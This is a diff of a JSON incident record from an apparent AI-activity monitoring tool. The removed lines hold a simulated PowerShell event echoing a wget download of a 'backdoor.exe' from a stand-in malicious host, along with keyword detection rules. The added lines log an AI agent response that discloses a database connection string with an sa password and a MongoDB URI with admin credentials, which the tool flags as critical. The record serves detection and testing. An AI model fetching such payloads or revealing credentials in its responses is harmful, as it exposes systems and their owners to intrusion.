@@ -1,25 +1,56 @@
 {
     "incident_id": "INC-0013",
+    "incident_type": "DATA_DISCLOSURE",
     "ai_event": {
-        "agent": "Background Script/AI",
-        "action": "terminal",
-        "timestamp": "2026-06-18T16:44:06.9046326Z"
-    },
-    "sysmon_event": {
-        "EventID": 1,
-        "TimestampUTC": "2026-06-18T16:44:06.9046326Z",
-        "ProcessId": "7736",
-        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "CommandLine": "powershell.exe  -Command \"Write-Host \"[ATTACK] wget http://malicious.site/backdoor.exe\"\"",
-        "ParentProcessId": "6672",
-        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+        "ai_event_id": "RESP-1782403862450",
+        "event_type": "response",
+        "agent": "Aider",
+        "action": "response",
+        "tool": "unknown",
+        "timestamp": "2026-06-25T16:11:02.450423+00:00",
+        "raw_command": "",
+        "session_id": "session-b878878f",
+        "user": "",
+        "content": "Server=prod-db.internal.corp;Database=CustomerDB;User Id=sa;Password=P@ssw0rd123!\nMongoDB: mongodb+srv://admin:supersecret@cluster0.mongodb.net/production",
+        "model": "gpt-4",
+        "response_analysis": {
+            "has_sensitive_data": true,
+            "disclosure_score": 65,
+            "risk_level": "CRITICAL",
+            "detected_secrets": [
+                {
+                    "type": "password",
+                    "description": "Password",
+                    "severity": "HIGH"
+                },
+                {
+                    "type": "mongo_uri",
+                    "description": "MongoDB URI",
+                    "severity": "CRITICAL"
+                }
+            ],
+            "analyzed_at": "2026-06-25T16:11:02.450576+00:00"
+        },
         "_correlated": true
     },
-    "severity": "CRITICAL",
-    "matched_rules": [
-        "Suspicious Keyword: wget",
-        "Suspicious Keyword: http",
-        "Process: PowerShell",
-        "Network: Outbound Comm"
-    ]
+    "sysmon_event": {},
+    "response_analysis": {
+        "has_sensitive_data": true,
+        "disclosure_score": 65,
+        "risk_level": "CRITICAL",
+        "detected_secrets": [
+            {
+                "type": "password",
+                "description": "Password",
+                "severity": "HIGH"
+            },
+            {
+                "type": "mongo_uri",
+                "description": "MongoDB URI",
+                "severity": "CRITICAL"
+            }
+        ],
+        "analyzed_at": "2026-06-25T16:11:02.450576+00:00"
+    },
+    "severity": "CRITICAL"
 }
